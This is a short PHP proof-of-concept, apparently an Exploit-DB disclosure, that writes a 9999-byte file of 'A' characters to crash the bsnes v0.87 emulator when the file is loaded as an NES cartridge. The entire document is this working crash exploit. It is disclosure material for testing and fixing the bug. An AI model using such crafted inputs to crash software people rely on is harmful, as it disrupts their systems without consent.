<?php
# bsnes v0.87 Local Daniel Of Service
# Tested on Windows 7 64Bit
# Software Site: http://byuu.org/bsnes/
# Software Download: http://www.emulator-zone.com/download.php/emulators/snes/bsnes/bsnes_v087-64bit.7z
# Author: Pr0T3cT10n
##################################################################
# bsnes v0.87 is vulnerable to local denial of service attack.
# When we try to open a file by 'Catridge' -> 'Load NES Catridge'
# that contains 9999 chars ('A'), so bsnes should crash.
##################################################################
# PoC / Code:
$buffer = str_repeat('A', 9999); # Create 9999 chars('A')..
if(file_put_contents('crash.nes', $buffer)) {
 echo("File created successfuly.\r\bsnes should crash when you open the file with it.\r\n");
} else {
 echo("Can't create file. Please try again.\r\n");
}
# Cya :)
# 0x31337.net
####################

 
# Exploit-DB Note:
# 32bit version also affected
# Tested on: Windows XP Pro Eng.
# http://www.emulator-zone.com/download.php/emulators/snes/bsnes/bsnes_v087-32bit.7z
?>
